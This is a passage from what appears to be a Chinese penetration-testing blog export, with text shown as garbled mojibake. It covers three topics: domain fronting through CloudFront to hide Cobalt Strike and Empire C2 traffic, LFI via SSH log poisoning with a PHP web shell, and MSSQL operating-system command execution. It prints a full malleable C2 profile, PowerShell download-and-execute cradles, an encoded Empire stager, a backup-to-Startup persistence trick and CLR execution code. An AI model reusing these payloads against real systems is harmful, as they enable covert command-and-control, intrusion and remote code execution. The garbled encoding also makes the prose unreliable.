d289wv3b5uz3me.cloudfront.net" &amp;&amp; echo $i$j; done;done å¦‚ä¸‹å›¾ï¼š å½“ç„¶è¿™é‡Œè¿˜å¯ä»¥å†™ä¸€ä¸ªè„šæœ¬æ¥ä»çƒ­é—¨ç½‘ç«™åˆ—è¡¨ä¸­å¯»æ‰¾å¯ä»¥ä½¿ç”¨çš„CDNå­åŸŸï¼Œå…³äºè¿™ä¸ªå¯ä»¥å‚è€ƒè¿™ä¸ªæ–‡ç« Domain Fronting Via Cloudfront Alternate Domainsã€‚ ä¸‹é¢åˆ†äº«å‡ ä¸ªå¯ç”¨çš„åŸŸåï¼š cdn.az.govï¼Œcdn.zendesk.comï¼Œcdn.atlassian.comï¼Œa1.awsstatic.comï¼Œf0.awsstatic.com 0x04 åº”ç”¨1.Cobalt Strikeå¤§å®¶éƒ½çŸ¥é“ï¼ŒCobalt Strikeå¯ä»¥é€šè¿‡Malleable C2 profileæ¥ä¿®æ”¹beconçš„ä¼ è¾“æ–¹å¼ï¼Œé‚£ä¹ˆåœ¨è¿™é‡Œï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡è¿™ä¸ªæ¥è¿›è¡Œé‡å®šå‘ã€‚æ‰€ä»¥è¦ä¿®æ”¹çš„å°±æ˜¯åœ¨æ–‡ä»¶ä¸­ä¿®æ”¹headerçš„HostæŒ‡å‘æˆ‘ä»¬çš„èŠ‚ç‚¹ã€‚æ¯”å¦‚ï¼š123http-get &#123; client &#123; header "Host" "[your distribution].cloudfront.net"; 123http-post &#123; client &#123; header "Host" "[your distribution].cloudfront.net"; è¿™é‡Œè¦æ³¨æ„çš„æ˜¯http-getä¸http-postéƒ½è¦ä¿®æ”¹ã€‚ä¸€ä¸ªä¿®æ”¹å¥½çš„webbug.profileå¦‚ä¸‹ï¼š123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384# make our C2 look like a Google Web Bug# https://developers.google.com/analytics/resources/articles/gaTrackingTroubleshooting## Author: @armitagehackerhttp-get &#123; set uri "/__utm.gif"; client &#123; parameter "utmac" "UA-2202604-2"; parameter "utmcn" "1"; parameter "utmcs" "ISO-8859-1"; parameter "utmsr" "1280x1024"; parameter "utmsc" "32-bit"; parameter "utmul" "en-US"; header "Host" "d289wv3b5uz3me.cloudfront.net"; metadata &#123; netbios; prepend "__utma"; parameter "utmcc"; &#125; &#125; server &#123; header "Content-Type" "image/gif"; output &#123; # hexdump pixel.gif # 0000000 47 49 46 38 39 61 01 00 01 00 80 00 00 00 00 00 # 0000010 ff ff ff 21 f9 04 01 00 00 00 00 2c 00 00 00 00 # 0000020 01 00 01 00 00 02 01 44 00 3b prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b"; prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00"; prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00"; print; &#125; &#125;&#125;http-post &#123; set uri "/___utm.gif"; client &#123; header "Content-Type" "application/octet-stream"; id &#123; prepend "UA-220"; append "-2"; parameter "utmac"; &#125; parameter "utmcn" "1"; parameter "utmcs" "ISO-8859-1"; parameter "utmsr" "1280x1024"; parameter "utmsc" "32-bit"; parameter "utmul" "en-US"; header "Host" "d289wv3b5uz3me.cloudfront.net"; output &#123; print; &#125; &#125; server &#123; header "Content-Type" "image/gif"; output &#123; prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b"; prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00"; prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00"; print; &#125; &#125;&#125;# dress up the staging process toohttp-stager &#123; server &#123; header "Content-Type" "image/gif"; &#125;&#125; ä½¿ç”¨c2lint æ¥æµ‹è¯•ï¼š1./c2lint Malleable-C2-Profiles/normal/webbug.profile å¯ä»¥çœ‹åˆ°hostå·²ç»æ”¹æˆäº†æˆ‘ä»¬çš„èŠ‚ç‚¹åœ°å€ã€‚ä¹‹åå¯åŠ¨teamserver:1â˜ cobal sudo ./teamserver [your ip] hacktest webbug.profile ä¹‹åè¿æ¥åˆ°teamserverã€‚åˆ›å»ºç›‘å¬ï¼š æ³¨æ„hostå¡«çš„åœ°å€ã€‚å¹¶ä¸”è¦æ³¨æ„ç«¯å£ä¸€å®šè¦æ˜¯80ã€‚ä¹‹åå†å¡«å…¥æˆ‘ä»¬æ‰¾çš„é‚£äº›é«˜ä¿¡èª‰åŸŸååœ°å€ï¼Œæ¯”å¦‚cdn.az.gov,å½“ç„¶å¯ä»¥å¡«å…¥å¤šä¸ªï¼Œä»¥,éš”å¼€å³å¯ï¼š ä½¿ç”¨web Deliveryè¿›è¡Œæµ‹è¯•ï¼š ç”ŸæˆPosershellå‘½ä»¤å¦‚ä¸‹ï¼š1powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://d289wv3b5uz3me.cloudfront.net:80/a'))" å®¢æˆ·ç«¯è¿è¡Œä»¥åæˆåŠŸä¸Šçº¿ï¼š ä½¿ç”¨wiresharkæŸ¥çœ‹æµé‡ï¼š å¯ä»¥çœ‹åˆ°æµé‡é‡Œé¢å¹¶æ²¡æœ‰æˆ‘ä»¬çš„çœŸå®åŸŸåè€Œåªæœ‰æˆ‘ä»¬çš„èŠ‚ç‚¹åœ°å€ï¼Œè€Œè§£æçš„DNSåœ°å€æ˜¯é«˜ä¿¡èª‰åŸŸåçš„åœ°å€ã€‚ å¦‚æœæƒ³ä½¿ç”¨HTTPSï¼Œå¯ä»¥å‚è€ƒä½¿ç”¨HTTPS beaconï¼ŒåŠè¿™ä¸ªè§†é¢‘ã€‚æœ¬æ–‡å°±ä¸åšä»‹ç»äº†ã€‚ 2.Empireä½¿ç”¨Empire2.0(ä¹‹æ‰€ä»¥ä½¿ç”¨2.0ï¼Œæ˜¯å› ä¸º2.0å¯ä»¥è‡ªå®šä¹‰httpå¤´ä¿¡æ¯ï¼Œåªéœ€è¦ä½¿ç”¨â€|â€ éš”å¼€å³å¯)ï¼Œéœ€è¦å¯¹Listenerè¿›è¡Œé‡æ–°é…ç½®ã€‚å…·ä½“è®¾ç½®å¦‚ä¸‹ï¼š1234567(Empire: listeners) &gt; uselistener http(Empire: listeners/http) &gt;(Empire: listeners/http) &gt; set Host http://cdn.az.gov:80(Empire: listeners/http) &gt; set DefaultProfile /admin/get.php,/news.asp,/login/process.jsp|Mozilla/5.0 (WindowsNT 6.1; WOW64; Trident/7.0;rv:11.0) like Gecko | Host:d289wv3b5uz3me.cloudfront.net(Empire: listeners/http) &gt; execute[*] Starting listener 'http'[+] Listener successfully started! ç‰¹åˆ«æ³¨æ„DefaultProfileåé¢æ·»åŠ äº†Hostï¼Œå¹¶ä¸”ä½¿ç”¨ç«¯å£ä¸º80ï¼ é…ç½®åç»“æœå¦‚ä¸‹ï¼š ä¹‹åå¼€å¯ç›‘å¬ï¼Œå¹¶é…ç½®stager1234(Empire: listeners) &gt; usestager multi/launcher(Empire: stager/multi/launcher) &gt; set Listener http(Empire: stager/multi/launcher) &gt; generatepowershell.exe -NoP -sta -NonI -W Hidden -Enc WwBSAEUAZgBdAC4AQQBTAFMARQBNAGIAbABZAC4ARwBlAFQAVABZAFAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAEUAVABGAGkAZQBMAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAQQBMAFUARQAoACQATgBVAGwATAAsACQAVAByAFUARQApAH0AOwBbAFMAeQBTAHQAZQBtAC4ATgBFAHQALgBTAGUAUgB2AGkAYwBlAFAATwBpAE4AVABNAGEAbgBhAEcAZQByAF0AOgA6AEUAWABwAGUAQwB0ADEAMAAwAEMAbwBOAHQASQBOAFUAZQA9ADAAOwAkAHcAQwA9AE4ARQBXAC0ATwBCAEoARQBDAHQAIABTAHkAUwBUAEUATQAuAE4AZQBUAC4AVwBFAEIAQwBMAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwBOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAFcAYwAuAEgARQBBAEQARQBSAFMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAHcAYwAuAFAAUgBvAHgAWQA9AFsAUwBZAHMAVABFAG0ALgBOAGUAdAAuAFcARQBiAFIARQBxAFUAZQBTAFQAXQA6ADoARABlAEYAYQB1AEwAdABXAEUAQgBQAHIAbwBYAHkAOwAkAHcAYwAuAFAAUgBvAHgAeQAuAEMAUgBlAEQARQBOAHQAaQBhAEwAcwAgAD0AIABbAFMAWQBzAHQARQBtAC4ATgBlAFQALgBDAHIAZQBEAGUAbgBUAEkAQQBsAEMAQQBjAGgAZQBdADoAOgBEAEUARgBhAFUAbAB0AE4ARQBUAHcATwByAGsAQwByAGUAZABlAG4AVABJAGEAbABTADsAJABLAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQBYAFQALgBFAG4AQwBvAGQASQBuAEcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAHQAQgB5AHQARQBzACgAJwBlADEAMABhAGQAYwAzADkANAA5AGIAYQA1ADkAYQBiAGIAZQA1ADYAZQAwADUANwBmADIAMABmADgAOAAzAGUAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAUgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AVQBuAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AQgB4AE8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAB3AEMALgBIAEUAQQBEAGUAcgBzAC4AQQBkAGQAKAAiAEgAbwBzAHQAIgAsACIAZAAyADgAOQB3AHYAMwBiADUAdQB6ADMAbQBlAC4AYwBsAG8AdQBkAGYAcgBvAG4AdAAuAG4AZQB0ACIAKQA7ACQAVwBjAC4ASABFAEEAZABFAHIAUwAuAEEAZABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0AUgBTAHoAKwB5AEQAUABVAFEAcgBwAGwAVQBNAGQAbABKAEIAKwBVAEoAZwBEAHAAagB1AHcAPQAiACkAOwAkAHMAZQByAD0AJwBoAHQAdABwADoALwAvAGMAZABuAC4AYQB6AC4AZwBvAHYAOgA4ADAAJwA7ACQAdAA9ACcALwBuAGUAdwBzAC4AYQBzAHAAJwA7ACQAZABBAHQAYQA9ACQAVwBDAC4ARABPAFcATgBsAG8AYQBEAEQAYQB0AEEAKAAkAHMARQByACsAJABUACkAOwAkAGkAVgA9ACQAZABBAHQAQQBbADAALgAuADMAXQA7ACQAZABhAHQAYQA9ACQARABBAHQAQQBbADQALgAuACQARABBAFQAYQAuAEwARQBuAGcAdABIAF0AOwAtAGoAbwBpAG4AWwBDAGgAYQBSAFsAXQBdACgAJgAgACQAUgAgACQARABhAFQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA æ‰§è¡Œè¿‡ç¨‹å¦‚ä¸‹ï¼š å…¶DNSæŸ¥è¯¢ç»“æœä¸ºï¼š å¼€å¯çš„ç½‘ç»œè¿æ¥ä¸ºï¼š 0x05 å°ç»“ä½¿ç”¨æ­¤æŠ€å·§å¯ä»¥æœ‰æ•ˆåœ°éšè—è‡ªå·±çš„çœŸå®åœ°å€ï¼Œå¹¶ä¸”å¯ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šç»•è¿‡æŸäº›é˜²æŠ¤ï¼Œåœ¨æ¸—é€æµ‹è¯•ä¸­åº”è¯¥æ˜¯ä¸€ä¸ªå¾ˆä¸é”™çš„æŠ€æœ¯ï¼Œå¸Œæœ›æ­¤æ–‡å¯¹ä½ æœ‰æ‰€å¸®åŠ©ã€‚ 0x06 å‚è€ƒ1ã€https://www.optiv.com/blog/escape-and-evasion-egressing-restricted-networks2ã€https://www.bamsoftware.com/papers/fronting/3ã€https://www.mdsec.co.uk/2017/02/domain-fronting-via-cloudfront-alternate-domains/4ã€https://www.xorrior.com/Empire-Domain-Fronting/]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
      <tags>
        <tag>domain fronting</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LFI SSHæ—¥å¿—]]></title>
    <url>%2Farchives%2FLFI.html</url>
    <content type="text"><![CDATA[ç™»é™†SSHï¼š1ssh '&lt;?php system($_GET[â€˜câ€™]); ?&gt;'@192.168.1.105 åŒ…å«æ–‡ä»¶ï¼š1http://192.168.1.105/lfi/lfi.php?file=/var/log/auth.log&amp;c=ls]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Exec OS Command Via MSSQL]]></title>
    <url>%2Farchives%2FExec_OS_Command_Via_MSSQL.html</url>
    <content type="text"><![CDATA[0x00 ç®€ä»‹æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œå¤§å®¶ç»å¸¸ä¼šç¢°åˆ°é€šè¿‡MSSQLæ¥è¿›è¡Œææƒæˆ–æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ä¹‹ç±»çš„æ“ä½œï¼Œé€šå¸¸æˆ‘ä»¬ç»å¸¸ä¼šä½¿ç”¨xp_cmdshellæ¥è¿›è¡Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œä½†æ˜¯å½“xp_cmdshellä¸èƒ½ä½¿ç”¨çš„æ—¶å€™ï¼Œæˆ‘ä»¬è¿˜æœ‰ä»€ä¹ˆåˆ«çš„æ–¹å¼ä¹ˆï¼Ÿæœ¬æ–‡å°†ä»‹ç»ä¸åˆ†äº«ä¸€ä¸‹æˆ‘è‡ªå·±å­¦åˆ°çš„ä¸€äº›å§¿åŠ¿ã€‚ 0x01 å¸¸ç”¨çš„ä¸€äº›å§¿åŠ¿ 1. XP_CMDSHELLè¿™ä¸ªå¤§å®¶éƒ½æ¯”è¾ƒç†Ÿæ‚‰äº†ï¼Œé€šè¿‡xp_cmdshellæ¥æ‰§è¡Œå‘½ä»¤ï¼Œå¯ä½¿ç”¨ä»¥ä¸‹è¯­å¥æ¥æ‰§è¡Œ:1exec master..xp_cmdshell "whoami" é»˜è®¤æƒ…å†µä¸‹xp_cmdshell æ˜¯ç¦æ­¢çš„ï¼Œå¦‚ä¸‹å›¾ï¼š è¿™ä¸ªæ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¿›è¡Œå¼€å¯ï¼š1EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE; å…³é—­ä¸€æ ·,åªæ˜¯å°†ä¸Šé¢çš„åé¢çš„é‚£ä¸ªâ€1â€æ”¹æˆâ€0â€å°±å¯ä»¥äº†ã€‚å¼€å¯ä»¥åï¼Œåˆ™å¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ å¦‚æœxp_cmdshellè¢«åˆ é™¤ï¼Œå¯ä»¥å°è¯•ä¸Šä¼ xplog70.dllè¿›è¡Œæ¢å¤ï¼Œæ¢å¤è¯­å¥ï¼š1Exec master.dbo.sp_addextendedproc 'xp_cmdshell','D:\\xplog70.dll' 2. SP_OACREATEå½“xp_cmdshell åˆ é™¤ä»¥åï¼Œå¯ä»¥ä½¿ç”¨SP_OACreateã€‚é¦–å…ˆè¦æ‰“å¼€ç»„ä»¶ï¼š12345EXEC sp_configure 'show advanced options', 1; RECONFIGURE WITH OVERRIDE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE WITH OVERRIDE; EXEC sp_configure 'show advanced options', 0; ä¹‹åä½¿ç”¨ä»¥ä¸‹è¯­å¥æ‰§è¡Œå‘½ä»¤ï¼š1declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami &gt;d:\\temp\\1.txt' è¿™é‡Œè¦æ³¨æ„ä¸€ä¸‹ï¼Œæ­¤æ–¹å¼æ‰§è¡Œæ˜¯æ— å›æ˜¾çš„ 3. è‡ªå¯åŠ¨ä»¥ä¸‹æ–¹å¼éœ€è¦ç”µè„‘é‡å¯ã€‚æ·»åŠ æ³¨å†Œè¡¨ï¼š1xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\currentversion\run','exec','REG_SZ','ipconfig' å¤‡ä»½æ·»åŠ å¯åŠ¨é¡¹ï¼š123456789alter database test set RECOVERY FULL-- (æŠŠSQLè®¾ç½®æˆæ—¥å¿—å®Œå…¨æ¢å¤æ¨¡å¼)create table cmd (a image)-- (æ–°å»ºç«‹ä¸€ä¸ªcmdè¡¨)backup database test to disk = 'D:\\temp\\cmd' WITH init --backup log test to disk = 'D:\\temp\\cmd1' WITH init -- (å‡å°‘å¤‡åˆ†æ•°æ®çš„å¤§å°)insert into cmd (a) values (0x0a406563686f206f66660d0a406563686f206f66660d0a40636d642e657865202f63206563686f2077686f616d69203e643a5c74656d705c332e7478740d0a40636d642e657865202f63206563686f2077686f616d69203e643a5c74656d705c332e7478740d0a400d0a40)-- (æ’å…¥cmdå‘½ä»¤)backup log test to disk = 'C:\\Documents and Settings\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\1.bat'-- (å¤‡åˆ†æ—¥å¿—åˆ°å¯åŠ¨è·¯å¾„ï¼‰drop table cmd --(åˆ é™¤æ–°å»ºçš„cmdè¡¨ï¼‰alter database test set RECOVERY SIMPLE--(æŠŠSQLè®¾ç½®æˆæ—¥å¿—ç®€å•æ¢å¤æ¨¡å¼) æµ‹è¯•å‘ç°ï¼ŒWin10+MSSQL 2012å¯¼å‡ºçš„æ‰¹å¤„ç†å¹¶ä¸èƒ½é¡ºåˆ©æ‰§è¡Œï¼Œå¯èƒ½ä¸ç³»ç»ŸåŠæ•°æ®åº“ç‰ˆæœ¬æœ‰ä¸€å®šå…³ç³»ï¼ŒæˆåŠŸç‡å¹¶ä¸æ€ä¹ˆé«˜ã€‚ 4. é€šè¿‡æ²™ç›’æ‰§è¡Œå‘½ä»¤å¼€å¯æ²™ç›’ï¼š1exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1 ç„¶ååˆ©ç”¨jet.oledbæ‰§è¡Œå‘½ä»¤ï¼š1select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\dnary.mdb','select shell("whoami")') 0x02 é€šè¿‡Agent Jobæ‰§è¡Œå‘½ä»¤æ­¤ç§æ–¹å¼é€‚ç”¨äºæœåŠ¡å™¨å¼€å¯äº†MSSQL Agent JobæœåŠ¡ï¼Œå¹¶ä¸”æœåŠ¡å™¨ä¸­å½“å‰è¿è¡Œçš„ç”¨æˆ·è´¦å·æ‹¥æœ‰è¶³å¤Ÿçš„æƒé™å»åˆ›å»ºå¹¶æ‰§è¡Œä»£ç†ä½œä¸šçš„æƒ…å†µã€‚åˆ©ç”¨ä»£ç å¦‚ä¸‹ï¼š1USE msdb; EXEC dbo.sp_add_job @job_name = N'test_powershell_job1' ; EXEC sp_add_jobstep @job_name = N'test_powershell_job1', @step_name = N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(''http://IP_OR_HOSTNAME/file''))"', @retry_attempts = 1, @retry_interval = 5 ;EXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job1'; EXEC dbo.sp_start_job N'test_powershell_job1'; å…³äºæ­¤ç§æ–¹å¼å·²ç»æœ‰æ–‡ç« è¿›è¡Œä»‹ç»ï¼Œæœ‰å…´è¶£å¯ä»¥é˜…è¯»ä¸€ä¸‹ã€‚æˆ³æˆ‘ 0x03 SQL Server CLRè¿™ç§æ–¹å¼æ˜¯æœ€è¿‘æ‰å­¦åˆ°çš„ï¼Œä¹Ÿæ˜¯æœ¬æ–‡é‡ç‚¹ä»‹ç»çš„ä¸€ç§å§¿åŠ¿ã€‚Microsoft SQL Server ç°åœ¨å…·å¤‡ä¸ Microsoft Windows .NET Framework çš„å…¬å…±è¯­è¨€è¿è¡Œæ—¶ (CLR) ç»„ä»¶é›†æˆçš„åŠŸèƒ½ã€‚CLR ä¸ºæ‰˜ç®¡ä»£ç æä¾›æœåŠ¡ï¼Œä¾‹å¦‚è·¨è¯­è¨€é›†æˆã€ä»£ç è®¿é—®å®‰å…¨æ€§ã€å¯¹è±¡ç”Ÿå­˜æœŸç®¡ç†ä»¥åŠè°ƒè¯•å’Œåˆ†ææ”¯æŒã€‚å¯¹äº SQL Server ç”¨æˆ·å’Œåº”ç”¨ç¨‹åºå¼€å‘äººå‘˜æ¥è¯´ï¼ŒCLR é›†æˆæ„å‘³ç€æ‚¨ç°åœ¨å¯ä»¥ä½¿ç”¨ä»»ä½• .NET Framework è¯­è¨€ï¼ˆåŒ…æ‹¬ Microsoft Visual Basic .NET å’Œ Microsoft Visual C#ï¼‰ç¼–å†™å­˜å‚¨è¿‡ç¨‹ã€è§¦å‘å™¨ã€ç”¨æˆ·å®šä¹‰ç±»å‹ã€ç”¨æˆ·å®šä¹‰å‡½æ•°ï¼ˆæ ‡é‡å‡½æ•°å’Œè¡¨å€¼å‡½æ•°ï¼‰ä»¥åŠç”¨æˆ·å®šä¹‰çš„èšåˆå‡½æ•°ã€‚è¦é€šè¿‡æ­¤ç§æ–¹å¼æ¥æ‰§è¡Œå‘½ä»¤ï¼Œä¹Ÿæœ‰å‡ ä¸ªå‰æï¼š1ã€åœ¨SQL Serverä¸Šèƒ½å¯ç”¨CLRå¹¶å¯ä»¥åˆ›å»ºè‡ªå®šä¹‰å­˜å‚¨è¿‡ç¨‹2ã€SQL Serverå½“å‰è´¦å·å…·æœ‰æ‰§è¡Œå‘½ä»¤/ä»£ç æ‰€éœ€è¦çš„æƒé™åˆ›å»ºCLRæœ‰ä¸¤ç§æ–¹å¼:æ–¹å¼ä¸€ï¼šä½¿ç”¨DLLæ–‡ä»¶è¿›è¡Œåˆ›å»º1CREATE ASSEMBLY AssemblyName from â€˜DLLPathâ€™ æ–¹å¼äºŒï¼šä½¿ç”¨æ–‡ä»¶16è¿›åˆ¶æµè¿›è¡Œåˆ›å»º1CREATE ASSEMBLY AssemblyName from æ–‡ä»¶åå…­è¿›åˆ¶æµ å¯¹äºåšæ¸—é€çš„æˆ‘ä»¬ï¼Œå½“ç„¶æ˜¯æ²¡æœ‰æ–‡ä»¶æ˜¯æœ€å¥½çš„æ–¹å¼äº†ï¼Œå› æ­¤ï¼Œæœ¬æ–‡ä¸»è¦ä»‹ç»æ–¹å¼äºŒã€‚ä»¥ä¸‹ä¸ºè¯¦ç»†æµ‹è¯•æ­¥éª¤ï¼š1ã€å®‰è£…Visual Studioå’ŒSQL Serveræ•°æ®åº“ï¼Œæ­¤æ¬¡æµ‹è¯•ä½¿ç”¨äº†VS2015è·ŸSQL2012ã€‚2ã€åˆ›å»ºä¸€ä¸ªæ–°çš„SQL Serveræ•°æ®åº“é¡¹ç›® 3ã€è®¾ç½®é¡¹ç›®å±æ€§ï¼Œç›®æ ‡å¹³å°ä¿®æ”¹ä¸ºéœ€è¦çš„ç›®æ ‡å¹³å°ï¼Œå¦‚SQL Server 2012; å°†SQLCLRæƒé™çº§åˆ«ä¿®æ”¹ä¸ºUNSAFEï¼›ä¿®æ”¹.Net æ¡†æ¶ç‰ˆæœ¬ä¸ºè‡ªå·±éœ€è¦çš„ç‰ˆæœ¬ï¼›è¯­è¨€é€‰æ‹©C#ã€‚ 4ã€å³é”®é¡¹ç›®ï¼Œé€‰æ‹©æ·»åŠ -&gt;æ–°å»ºé¡¹ï¼Œæ–°å»ºSQL CLR C# å­˜å‚¨è¿‡ç¨‹ 5ã€å¡«å…¥ä»¥ä¸‹æµ‹è¯•ä»£ç ï¼š12345678910111213141516171819202122using System;using System.Data;using System.Data.SqlClient;using System.Data.SqlTypes;using Microsoft.SqlServer.Server;using System.Collections.Generic;using System.Text;using System.Threading.Tasks;public partial class StoredProcedures&#123; [Microsoft.SqlServer.Server.SqlProcedure] public static void SqlStoredProcedure1 () &#123; // åœ¨æ­¤å¤„æ”¾ç½®ä»£ç  System.Diagnostics.Process process = new System.Diagnostics.Process(); process.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden; process.StartInfo.FileName = "cmd.exe"; process.StartInfo.Arguments = "/C whoami &gt; d:\\temp\\1.txt"; process.Start(); &#125;&#125; 6ã€å¡«å…¥ä»£ç ä»¥åè¿›è¡Œç¼–è¯‘ï¼Œä¹‹ååˆ°ç¼–è¯‘ç›®å½•ä¸‹å¯ä»¥çœ‹åˆ°ä¸€ä¸ªdacpacåç¼€çš„æ–‡ä»¶ã€‚ 7ã€åŒå‡»æ­¤æ–‡ä»¶è¿›è¡Œè§£å‹ï¼Œå°†è§£å‹å‡ºä¸€ä¸ªåä¸ºmode.sqlçš„æ–‡ä»¶ã€‚8ã€æ‰§è¡ŒSQLæ–‡ä»¶ä¸­çš„ä»¥ä¸‹è¯­å¥1234CREATE ASSEMBLY [ExecCode] AUTHORIZATION [dbo] FROM 0x4D5A[...snip...] WITH PERMISSION_SET = UNSAFE; ä¹‹åæ‰§è¡Œï¼š12CREATE PROCEDURE [dbo].[SqlStoredProcedure1]AS EXTERNAL NAME [ExecCode].[StoredProcedures].[SqlStoredProcedure1] 9ã€å¼€å¯æ•°æ®åº“æœåŠ¡å™¨é…ç½®é€‰é¡¹clr enabled1234567891011EXEC sp_configure N'show advanced options', N'1' RECONFIGURE WITH OVERRIDE--å¼€å¯clr enabled é€‰é¡¹EXEC sp_configure N'clr enabled', N'1'RECONFIGURE WITH OVERRIDE --å…³é—­æ‰€æœ‰æœåŠ¡å™¨é…ç½®é€‰é¡¹EXEC sp_configure N'show advanced options', N'0' RECONFIGURE WITH OVERRIDE--å¦‚æœå­˜åœ¨æƒé™é—®é¢˜ï¼Œæ‰§è¡Œä¸‹é¢ä¸€æ®µè„šæœ¬alter database [master] set TRUSTWORTHY onEXEC sp_changedbowner 'sa' 10ã€æ‰§è¡Œå‘½ä»¤ï¼š1EXEC [dbo].[SqlStoredProcedure1]; å¦‚æœæ²¡æˆåŠŸï¼Œå¯ä»¥æ¢ä¸ªæ•°æ®åº“è¯•è¯•çœ‹ã€‚ 11ã€åˆ é™¤å­˜å‚¨è¿‡ç¨‹12DROP PROCEDURE [dbo].[SqlStoredProcedure1];DROP ASSEMBLY ExecCode; 0x04 PowerUpSQLå½“ç„¶é’ˆå¯¹SQL Serverçš„æ”»å‡»ï¼Œæœ‰ä¸€ä¸ªå¼ºå¤§çš„å·¥å…·PowerUpSQLï¼Œé‡Œé¢ä¹Ÿæœ‰å¾ˆå¤šé’ˆå¯¹MSSQLçš„æ”»å‡»æ–¹å¼ã€‚ä¸‹é¢ä»‹ç»ä¸¤ç§æ¯”è¾ƒå®ç”¨çš„æ–¹å¼ã€‚ 1. SP_Addextendedprocå¥—ä»¶ä¸­çš„Create-SQLFileXpDllæ–¹æ³•ï¼Œåœ¨è¿™é‡Œå¯¹å…¶ä½¿ç”¨æ–¹å¼ç®€å•çš„è¿›è¡Œä¸€ä¸‹ä»‹ç»ã€‚åˆ›å»ºDLLï¼š123PS C:\Users\Evi1cg\Desktop\PowerUpSQL&gt; . .\PowerUpSQL.ps1PS C:\Users\Evi1cg\Desktop\PowerUpSQL&gt; Create-SQLFileXpDll -OutFile D:\temp\exec.dll -Command "echo Exec test &gt; D:\temp\test.txt" -ExportName xp_test SQL Server é€šè¿‡ sp_addextendedproc è°ƒç”¨DLLä»è€Œè¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœã€‚è¿™é‡Œæœ‰ä¸¤ç§æ–¹å¼å¯¼å…¥ï¼š1234//via local disksp_addextendedproc 'xp_test', 'D:\temp\exec.dll'//via UNC path:sp_addextendedproc 'xp_test', '\\servername\pathtofile\exec.dll' å¯¼å…¥ä¹‹åçš„å¯è°ƒç”¨xp_testæ¥æ‰§è¡Œå‘½ä»¤ï¼š1exec master..xp_test; é€šè¿‡ä»¥ä¸‹å‘½ä»¤å¯ä»¥å¸è½½ï¼š1sp_dropextendedproc 'xp_test' 2. SMB Relay 